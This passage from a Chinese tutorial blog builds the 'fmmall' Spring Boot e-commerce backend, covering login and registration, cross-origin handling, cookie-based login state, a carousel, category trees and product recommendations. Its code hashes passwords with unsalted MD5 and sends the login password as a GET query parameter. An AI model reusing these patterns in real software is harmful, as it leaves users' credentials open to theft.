  <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;queryUserByName&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>
    select
      user_id,
      username,
      password,
      nickname,
      realname,
      user_img,
      user_mobile,
      user_email,
      user_sex,
      user_birth,
      user_regtime,
      user_modtime
    from users
    where
      username = #&#123;name&#125;
  <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>

<span class="hljs-tag">&lt;/<span class="hljs-name">mapper</span>&gt;</span></code></pre>

</li>
</ol>
<p>1.1.2 完成service功能</p>
<ol>
<li><p>创建接口<code>com.sunzy.fmmall.service.UserService</code></p>
<pre><code class="hljs haxe"><span class="hljs-keyword">package</span> com.sunzy.fmmall.service;

<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResultVO;

<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">UserService</span> </span>&#123;

    <span class="hljs-keyword">public</span> ResultVO login(<span class="hljs-keyword">String</span> username, <span class="hljs-keyword">String</span> password);
    <span class="hljs-keyword">public</span> ResultVO regist(<span class="hljs-keyword">String</span> username, <span class="hljs-keyword">String</span> password);

&#125;</code></pre>



</li>
</ol>
<ol start="2">
<li><p>创建实现类 <code>com.sunzy.fmmall.service.Impl.UserServiceImpl</code></p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.service.Impl;

<span class="hljs-keyword">import</span> com.sunzy.fmmall.dao.UserDao;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.entity.Users;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.service.UserService;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.utils.MD5Utils;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResStatus;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResultVO;
<span class="hljs-keyword">import</span> org.springframework.stereotype.Service;
<span class="hljs-keyword">import</span> org.springframework.transaction.annotation.Transactional;

<span class="hljs-keyword">import</span> javax.annotation.Resource;
<span class="hljs-keyword">import</span> java.util.Date;


<span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">UserService</span> </span>&#123;


    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> UserDao userDao;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">login</span><span class="hljs-params">(String username, String password)</span> </span>&#123;

        Users user = userDao.queryUserByName(username);
        <span class="hljs-keyword">if</span>(user == <span class="hljs-keyword">null</span>)&#123;
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;用户不存在！&quot;</span>, <span class="hljs-keyword">null</span>);
        &#125;
        String realPasswd = user.getPassword();
        <span class="hljs-keyword">if</span>(realPasswd.equals(MD5Utils.md5(password)))&#123;
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, <span class="hljs-string">&quot;登录成功！&quot;</span>, user);
        &#125;<span class="hljs-keyword">else</span> &#123;
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;密码错误！&quot;</span>, <span class="hljs-keyword">null</span>);
        &#125;
    &#125;

    <span class="hljs-meta">@Transactional</span>
    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">regist</span><span class="hljs-params">(String username, String password)</span> </span>&#123;
        <span class="hljs-keyword">synchronized</span> (<span class="hljs-keyword">this</span>)&#123;
            <span class="hljs-comment">// 判断用户是否已经注册</span>
            Users user = userDao.queryUserByName(username);
            <span class="hljs-keyword">if</span>(user == <span class="hljs-keyword">null</span>)&#123;
                <span class="hljs-comment">// 将新用户信息添加到数据库中</span>
                String md5 = MD5Utils.md5(password);
                user = <span class="hljs-keyword">new</span> Users();
                user.setPassword(md5);
                user.setUsername(username);
                user.setUserImg(<span class="hljs-string">&quot;img/default.png&quot;</span>);
                user.setUserRegtime(<span class="hljs-keyword">new</span> Date());
                user.setUserModtime(<span class="hljs-keyword">new</span> Date());

                <span class="hljs-keyword">int</span> i = userDao.insertUser(user);
                <span class="hljs-keyword">if</span>(i &gt; <span class="hljs-number">0</span>)&#123;
                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, <span class="hljs-string">&quot;用户注册成功！&quot;</span>, user);
                &#125;<span class="hljs-keyword">else</span> &#123;
                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;用户注册失败！&quot;</span>, <span class="hljs-keyword">null</span>);
                &#125;
            &#125;<span class="hljs-keyword">else</span>&#123;
                <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;用户已被注册！&quot;</span>, <span class="hljs-keyword">null</span>);
            &#125;
        &#125;
    &#125;
&#125;
</code></pre>

</li>
</ol>
<p>1.1.3 完成controller代码</p>
<pre><code class="hljs java"><span class="hljs-keyword">package</span> com.sunzy.fmmall.controller;

<span class="hljs-keyword">import</span> com.sunzy.fmmall.entity.Users;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.service.UserService;
<span class="hljs-keyword">import</span> com.sunzy.fmmall.vo.ResultVO;
<span class="hljs-keyword">import</span> io.swagger.annotations.Api;
<span class="hljs-keyword">import</span> io.swagger.annotations.ApiImplicitParam;
<span class="hljs-keyword">import</span> io.swagger.annotations.ApiImplicitParams;
<span class="hljs-keyword">import</span> io.swagger.annotations.ApiOperation;
<span class="hljs-keyword">import</span> org.springframework.beans.factory.annotation.Autowired;
<span class="hljs-keyword">import</span> org.springframework.web.bind.annotation.*;


<span class="hljs-comment">//@RequestBody</span>
<span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping(&quot;/user&quot;)</span>
<span class="hljs-meta">@Api(value = &quot;用户管理&quot;, tags = &quot;提供用户注册和登录接口&quot;)</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">UserController</span> </span>&#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> UserService userService;

    <span class="hljs-meta">@ApiOperation(&quot;用户登录接口&quot;)</span>
    <span class="hljs-meta">@ApiImplicitParams(&#123;</span>
<span class="hljs-meta">            @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;username&quot;, value = &quot;用户账号&quot;, required = true),</span>
<span class="hljs-meta">            @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;password&quot;, value = &quot;用户密码&quot;, required = true)</span>
<span class="hljs-meta">    &#125;)</span>
    <span class="hljs-meta">@GetMapping(&quot;/login&quot;)</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">login</span><span class="hljs-params">(<span class="hljs-meta">@RequestParam(&quot;username&quot;)</span> String username,</span></span>
<span class="hljs-function"><span class="hljs-params">                          <span class="hljs-meta">@RequestParam(&quot;password&quot;)</span> String password)</span></span>&#123;
        <span class="hljs-keyword">return</span> userService.login(username, password);
    &#125;

    <span class="hljs-meta">@ApiOperation(&quot;用户注册接口&quot;)</span>
<span class="hljs-comment">//    @ApiImplicitParams(&#123;</span>
<span class="hljs-comment">//            @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;username&quot;, value = &quot;用户注册账号&quot;, required = true),</span>
<span class="hljs-comment">//            @ApiImplicitParam(dataType = &quot;string&quot;, name = &quot;password&quot;, value = &quot;用户注册密码&quot;, required = true)</span>
<span class="hljs-comment">//    &#125;)</span>
    <span class="hljs-meta">@PostMapping(&quot;/regist&quot;)</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">regist</span><span class="hljs-params">(<span class="hljs-meta">@RequestBody</span> Users user)</span></span>&#123;
        String username = user.getUsername();
        String password = user.getPassword();
        <span class="hljs-keyword">return</span> userService.regist(username, password);
    &#125;
&#125;
</code></pre>

<p>1.1.4 接口测试</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220710210231769.png" alt="image-20220710210231769"></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220710210251564.png" alt="image-20220710210251564"></p>
<h3 id="1-2-解决前后端跨域问题"><a href="#1-2-解决前后端跨域问题" class="headerlink" title="1.2 解决前后端跨域问题"></a>1.2 解决前后端跨域问题</h3><p>1.1 前端</p>
<p><strong>通过jsonp跨域</strong></p>
<p>通常为了减轻web服务器的负载，我们把js、css，img等静态资源分离到另一台独立域名的服务器上，在html页面中再通过相应的标签从不同域名下加载静态资源，而被浏览器允许，基于此原理，我们可以通过动态创建script，再请求一个带参网址实现跨域通信。</p>
<pre><code class="hljs js">&lt;script&gt;
   <span class="hljs-keyword">var</span> script = <span class="hljs-built_in">document</span>.createElement(<span class="hljs-string">&#x27;script&#x27;</span>);
   script.type = <span class="hljs-string">&#x27;text/javascript&#x27;</span>;

   <span class="hljs-comment">// 传参一个回调函数名给后端，方便后端返回时执行这个在前端定义的回调函数</span>
   script.src = <span class="hljs-string">&#x27;http://www.domain2.com:8080/login?user=admin&amp;callback=handleCallback&#x27;</span>;
   <span class="hljs-built_in">document</span>.head.appendChild(script);

   <span class="hljs-comment">// 回调执行函数</span>
   <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">handleCallback</span>(<span class="hljs-params">res</span>) </span>&#123;
       alert(<span class="hljs-built_in">JSON</span>.stringify(res));
   &#125;
&lt;/script&gt;</code></pre>

<p>1.2 后端</p>
<p>只需要在controller中添加<code>@CrossOrigin</code>注解即可允许后端响应数据进行跨域响应。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712100855420.png" alt="image-20220712100855420"></p>
<h3 id="1-3-将用户信息显示在前端"><a href="#1-3-将用户信息显示在前端" class="headerlink" title="1.3 将用户信息显示在前端"></a>1.3 将用户信息显示在前端</h3><p>在前端登录（login.html的doSubmit方法中）的ajax请求的响应代码中加入以下内容</p>
<pre><code class="hljs js"><span class="hljs-keyword">if</span>(vo.code == <span class="hljs-number">10000</span>)&#123;
    <span class="hljs-comment">//如果登录成功，就把token存储到cookie</span>
    setCookieValue(<span class="hljs-string">&quot;token&quot;</span>,vo.msg);
    <span class="hljs-comment">//将用户昵称和用户头像的路径保存在cookie</span>
    setCookieValue(<span class="hljs-string">&quot;userId&quot;</span>,vo.data.userId);
    setCookieValue(<span class="hljs-string">&quot;username&quot;</span>,vo.data.username);
    setCookieValue(<span class="hljs-string">&quot;userImg&quot;</span>,vo.data.userImg)
&#125;</code></pre>

<p>即登录成功后，将用户的token和用户信息一同保存到cookie中，用于前端传值</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712103807945.png" alt="image-20220712103807945"></p>
<p>在index.html的created函数中添加以下代码</p>
<pre><code class="hljs js"><span class="hljs-keyword">var</span> token = getCookieValue(<span class="hljs-string">&quot;token&quot;</span>);
<span class="hljs-keyword">if</span>(token !=<span class="hljs-literal">null</span> &amp;&amp; token !=<span class="hljs-string">&quot;&quot;</span>)&#123;
    <span class="hljs-built_in">this</span>.isLogin = <span class="hljs-literal">true</span>;
    <span class="hljs-built_in">this</span>.username = getCookieValue(<span class="hljs-string">&quot;username&quot;</span>);
    <span class="hljs-built_in">this</span>.userimg = getCookieValue(<span class="hljs-string">&quot;userImg&quot;</span>);
&#125;</code></pre>

<p>获取到用户的基本信息，再通过v-model显示到前端页面中。</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712103740058.png" alt="image-20220712103740058"></p>
<h3 id="1-4-首页轮播图"><a href="#1-4-首页轮播图" class="headerlink" title="1.4 首页轮播图"></a>1.4 首页轮播图</h3><ul>
<li><p>数据库操作实现</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712104939741.png" alt="image-20220712104939741"></p>
</li>
<li><p>编写sql语句</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712105512286.png" alt="image-20220712105512286"></p>
<pre><code class="hljs mysql">SELECT * FROM index_img WHERE &#96;status&#96; &#x3D; 1 ORDER BY seq</code></pre>
</li>
<li><p>在IndexImgMapper定义方法</p>
<pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">IndexImgMapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">GeneralDao</span>&lt;<span class="hljs-title">IndexImg</span>&gt; </span>&#123;
    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;IndexImg&gt; <span class="hljs-title">listIndexImgs</span><span class="hljs-params">()</span></span>;
&#125;</code></pre>
</li>
<li><p>配置映射文件</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;listIndexImgs&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.IndexImg&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;BaseResultMap&quot;</span>&gt;</span>
    SELECT * FROM index_img WHERE `status` = 1 ORDER BY seq
<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span></code></pre>
</li>
<li><p>业务逻辑实现</p>
<p>IndexImgServiceImpl添加以下内容</p>
<pre><code class="hljs java"><span class="hljs-meta">@Service</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexImgServiceImpl</span> <span class="hljs-keyword">implements</span> <span class="hljs-title">IndexImgService</span> </span>&#123;

    <span class="hljs-meta">@Resource</span>
    <span class="hljs-keyword">private</span> IndexImgMapper indexImgMapper;

    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">listIndeximgs</span><span class="hljs-params">()</span> </span>&#123;

        List&lt;IndexImg&gt; indexImgs = indexImgMapper.listIndexImgs();
        <span class="hljs-keyword">if</span>(indexImgs.size() == <span class="hljs-number">0</span>)&#123;
            <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.NO, <span class="hljs-string">&quot;failed&quot;</span>, <span class="hljs-keyword">null</span>);
        &#125;
        <span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> ResultVO(ResStatus.OK, <span class="hljs-string">&quot;success&quot;</span>,indexImgs);
    &#125;
&#125;</code></pre>
</li>
<li><p>接口实现</p>
<p>IndexImgController</p>
<pre><code class="hljs java"><span class="hljs-meta">@RestController</span>
<span class="hljs-meta">@RequestMapping(&quot;/index&quot;)</span>
<span class="hljs-meta">@CrossOrigin</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">IndexImgsController</span> </span>&#123;

    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> IndexImgService indexImgService;

    <span class="hljs-meta">@GetMapping(&quot;/indeximg&quot;)</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">addGoods</span><span class="hljs-params">()</span></span>&#123;
        <span class="hljs-keyword">return</span> ResultVO.success(indexImgService.listIndeximgs());
    &#125;
&#125;
</code></pre>



</li>
</ul>
<h3 id="1-5-分类列表"><a href="#1-5-分类列表" class="headerlink" title="1.5 分类列表"></a>1.5 分类列表</h3><p>接口开发</p>
<ul>
<li><p>数据库分析</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712130956027.png" alt="image-20220712130956027"></p>
</li>
<li><p>添加实体类CategoryVO</p>
<p>与category的区别在于多了一个属性用于存放子标题</p>
<pre><code class="hljs abnf">List&lt;CategoryVO&gt; categoryVOList<span class="hljs-comment">;</span></code></pre>
</li>
<li><p>dao实现</p>
<ul>
<li><p>方法一</p>
<p>使用递归sql查询数据库</p>
<p>dao代码</p>
<pre><code class="hljs java"><span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;CategoryVO&gt; <span class="hljs-title">getCategoryList2</span><span class="hljs-params">(<span class="hljs-keyword">int</span> parentId)</span></span>;</code></pre>

<p>mapper映射文件</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;ResultMap&quot;</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.CategoryVO&quot;</span>&gt;</span>
    <span class="hljs-comment">&lt;!--</span>
<span class="hljs-comment">      WARNING - @mbg.generated</span>
<span class="hljs-comment">    --&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryId&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryName&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_level&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryLevel&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;parent_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;parentId&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_icon&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryIcon&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_slogan&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categorySlogan&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_pic&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryPic&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_bg_color&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryBgColor&quot;</span> /&gt;</span>
    <span class="hljs-tag">&lt;<span class="hljs-name">collection</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryVOList&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_id&quot;</span> <span class="hljs-attr">select</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.dao.CategoryMapper.getCategoryList2&quot;</span>/&gt;</span>
  <span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span>
  <span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;getCategoryList2&quot;</span> <span class="hljs-attr">resultType</span>=<span class="hljs-string">&quot;com.sunzy.fmmall.entity.CategoryVO&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;ResultMap&quot;</span>&gt;</span>
      select * from category where parent_id = #&#123;parentId&#125;
  <span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span>
</code></pre>
</li>
<li><p>方法二</p>
<p>直接获取所有分类的数据后，在java代码中进行级别分类的处理，可以大大提高处理效率</p>
</li>
</ul>
</li>
<li><p>service代码实现</p>
<ul>
<li><p>方法一</p>
<pre><code class="hljs java"><span class="hljs-meta">@Override</span>
<span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;CategoryVO&gt; <span class="hljs-title">getCategoryList</span><span class="hljs-params">()</span> </span>&#123;
    <span class="hljs-keyword">return</span> categoryMapper.getCategoryList2(<span class="hljs-number">0</span>);
&#125;</code></pre>



</li>
</ul>
</li>
</ul>
<ul>
<li><p>方法二</p>
<pre><code class="hljs java">    <span class="hljs-meta">@Override</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;CategoryVO&gt; <span class="hljs-title">getCategoryList</span><span class="hljs-params">()</span> </span>&#123;
        List&lt;Category&gt; categories = categoryMapper.getCategoryList();
        List&lt;CategoryVO&gt; categoryVOS = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();
        <span class="hljs-comment">// 获取所有的一级标题</span>
        <span class="hljs-keyword">for</span> (Category category : categories) &#123;
            CategoryVO categoryVO = <span class="hljs-keyword">new</span> CategoryVO();
            <span class="hljs-keyword">if</span>(category.getCategoryLevel() == <span class="hljs-number">1</span>)&#123;
                BeanUtils.copyProperties(category, categoryVO);
                categoryVOS.add(categoryVO);
            &#125;
        &#125;
        <span class="hljs-comment">// 将一级标题下的二级标题添加到setCategoryVOList属性中</span>
        <span class="hljs-keyword">for</span> (CategoryVO categoryVO : categoryVOS) &#123;
            List&lt;CategoryVO&gt; category2List = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;();
            <span class="hljs-keyword">for</span> (Category category : categories) &#123;
                <span class="hljs-comment">// 筛选条件为 二级标题且父标题与一级标题一致</span>
                <span class="hljs-keyword">if</span>(category.getCategoryLevel() == <span class="hljs-number">2</span> &amp;&amp; category.getParentId().equals(categoryVO.getCategoryId()))&#123;
                    CategoryVO categoryvo = <span class="hljs-keyword">new</span> CategoryVO();
                    BeanUtils.copyProperties(category, categoryvo);
                    category2List.add(categoryvo);
                &#125;
            &#125;
            categoryVO.setCategoryVOList(category2List);
<span class="hljs-comment">//            System.out.println(categoryVO);</span>
        &#125;
        <span class="hljs-keyword">for</span> (CategoryVO categoryVO : categoryVOS) &#123;

            <span class="hljs-keyword">for</span>(CategoryVO categoryVO2: categoryVO.getCategoryVOList())&#123;  <span class="hljs-comment">//遍历所有二级标题</span>
                List&lt;CategoryVO&gt; category3List = <span class="hljs-keyword">new</span> ArrayList&lt;&gt;(); <span class="hljs-comment">//保存三级标题的数组</span>
                <span class="hljs-keyword">for</span> (Category category : categories) &#123;
                    <span class="hljs-comment">// 筛选符合条件的三级标题 存放到二级标题的 categoryVOList中</span>
                    <span class="hljs-keyword">if</span>(category.getCategoryLevel() == <span class="hljs-number">3</span> &amp;&amp; category.getParentId().equals(categoryVO2.getCategoryId()))&#123;
                        CategoryVO categoryvo = <span class="hljs-keyword">new</span> CategoryVO();
                        BeanUtils.copyProperties(category, categoryvo);
                        category3List.add(categoryvo);
                    &#125;
                &#125;
                categoryVO2.setCategoryVOList(category3List);
            &#125;
            System.out.println(categoryVO);
        &#125;
        <span class="hljs-keyword">return</span> categoryVOS;
    &#125;</code></pre>

</li>
</ul>
<ul>
<li><p>controller实现</p>
<pre><code class="hljs java">    <span class="hljs-meta">@Autowired</span>
    <span class="hljs-keyword">private</span> CategoryService categoryService;
    <span class="hljs-meta">@GetMapping(&quot;/category-list&quot;)</span>
    <span class="hljs-meta">@ApiOperation(value = &quot;获取首页分类数据&quot;)</span>
    <span class="hljs-function"><span class="hljs-keyword">public</span> ResultVO <span class="hljs-title">getCategoryList</span><span class="hljs-params">()</span></span>&#123;
        <span class="hljs-keyword">return</span> ResultVO.success(categoryService.getCategoryList1());
<span class="hljs-comment">//        return ResultVO.success(categoryService.getCategoryList2());</span>
    &#125;</code></pre>

<p>实测方法二比方法一的响应速度要快很多倍，所以还是减少在数据库中进行数据的处理。</p>
<table>
<thead>
<tr>
<th>方法一</th>
<th>方法二</th>
</tr>
</thead>
<tbody><tr>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712173631776.png" alt="image-20220712173631776"></td>
<td><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712173546986.png" alt="image-20220712173546986"></td>
</tr>
</tbody></table>
<p>实现效果如下</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712174710162.png" alt="image-20220712174710162"></p>
</li>
</ul>
<h3 id="1-6-商品推荐"><a href="#1-6-商品推荐" class="headerlink" title="1.6 商品推荐"></a>1.6 商品推荐</h3><blockquote>
<p>推荐商品原则可以是 1.根据商城销量推荐2.推荐商城最新上架的商品</p>
<p>说明：商品推荐算法是根据多个维度进行权重计算的结果，计算出一个匹配值</p>
</blockquote>
<ul>
<li><p>数据库操作</p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712175743195.png" alt="image-20220712175743195"></p>
<p><img src="https://raw.githubusercontent.com/sunzhengyu99/image/master/img/image-20220712175819883.png" alt="image-20220712175819883"></p>
<pre><code class="hljs mysql">select * from product order by create_time desc limit 0,3;</code></pre>
</li>
<li><p>添加实体类ProdoctVO</p>
<p>与product的区别在于多一个属性用于存在与该产品相关的图片</p>
<pre><code class="hljs typescript"><span class="hljs-keyword">private</span> List&lt;ProductImg&gt; imgs;

<span class="hljs-keyword">public</span> List&lt;ProductImg&gt; <span class="hljs-function"><span class="hljs-title">getImgs</span>(<span class="hljs-params"></span>)</span> &#123;
<span class="hljs-keyword">return</span> imgs;
&#125;

<span class="hljs-keyword">public</span> <span class="hljs-built_in">void</span> <span class="hljs-function"><span class="hljs-title">setImgs</span>(<span class="hljs-params">List&lt;ProductImg&gt; imgs</span>)</span> &#123;
<span class="hljs-built_in">this</span>.imgs = imgs;
&#125;</code></pre>
</li>
<li><p>dao实现</p>
<ul>
<li><p>ProductDao</p>
<pre><code class="hljs java"><span class="hljs-meta">@Mapper</span>
<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">interface</span> <span class="hljs-title">ProductMapper</span> <span class="hljs-keyword">extends</span> <span class="hljs-title">GeneralDao</span>&lt;<span class="hljs-title">Product</span>&gt; </span>&#123;
    <span class="hljs-function"><span class="hljs-keyword">public</span> List&lt;Product&gt; <span class="hljs-title">getRecommendProduct</span><span class="hljs-params">()</span></span>;
&#125;</code></pre>

<p>xml</p>
<pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_name&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;VARCHAR&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productName&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;category_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;categoryId&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;root_category_id&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;rootCategoryId&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;sold_num&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;soldNum&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_status&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;INTEGER&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productStatus&quot;</span> /&gt;</span>
<span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;create_time&quot;</span> <span class="hljs-attr">jdbcType</span>=<span class="hljs-string">&quot;TIMESTAMP&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;createTime&quot;</span> /&gt;</span>
